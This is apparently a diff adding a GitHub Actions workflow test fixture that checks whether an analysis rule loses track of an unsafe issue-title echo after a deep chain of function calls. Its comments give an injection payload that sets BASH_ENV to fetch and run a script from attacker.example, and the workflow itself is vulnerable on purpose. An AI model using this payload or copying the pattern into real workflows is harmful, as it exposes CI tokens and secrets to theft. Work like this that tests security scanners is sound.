@@ -1,0 +1,45 @@
+# situation: on issues, a job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true
+#   in its env; a step passes the title of the issue in the environment
+#   variable T, defines a function w that sets T to a fixed word when
+#   SAFE_MODE is set (the step does not set SAFE_MODE),
+#   runs a chain of functions f0 to f13 in which each function calls the
+#   function before it twice (16,383 calls), calls w, and prints T; a step
+#   comes after.
+# reason: the call of w comes after the 4,096 calls of functions that the
+#   rule follows, so the rule does not read the body of w, and does not
+#   decide whether T holds the title of the issue when echo runs.
+# attack: the attacker opens an issue titled ##[set-env
+#   name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
+# attack-run-behavior: w sets nothing, the step prints the title, the
+#   runner sets BASH_ENV, and the bash of the next step runs the attacker's
+#   script with the token and the secrets of the job.
+on: issues
+permissions: {}
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
+    steps:
+      - env:
+          T: ${{ github.event.issue.title }}
+        run: |
+          w() { if [ -n "$SAFE_MODE" ]; then T=safe; fi; }
+          f0() { :; }
+          f1() { f0; f0; }
+          f2() { f1; f1; }
+          f3() { f2; f2; }
+          f4() { f3; f3; }
+          f5() { f4; f4; }
+          f6() { f5; f5; }
+          f7() { f6; f6; }
+          f8() { f7; f7; }
+          f9() { f8; f8; }
+          f10() { f9; f9; }
+          f11() { f10; f10; }
+          f12() { f11; f11; }
+          f13() { f12; f12; }
+          f13
+          w
+          echo "issue: $T"
+      - run: echo next
